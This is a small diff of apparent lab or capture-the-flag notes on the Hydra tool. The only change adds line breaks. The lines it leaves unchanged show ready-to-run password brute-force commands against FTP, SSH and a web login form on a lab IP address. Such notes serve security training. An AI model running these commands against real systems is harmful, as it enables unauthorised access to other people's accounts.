@@ -13,13 +13,13 @@ https://en.kali.tools/?p=220
 
 
 <br>
-FTP
+FTP<br>
 hydra -l user -P passlist.txt ftp://10.10.149.84
 
-SSH
+SSH<br>
 hydra -l <username> -P <full path to pass> 10.10.149.84 -t 4 ssh
 
   
- Web Form
+ Web Form<br>
 hydra -l <username> -P <wordlist> 10.10.149.84 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
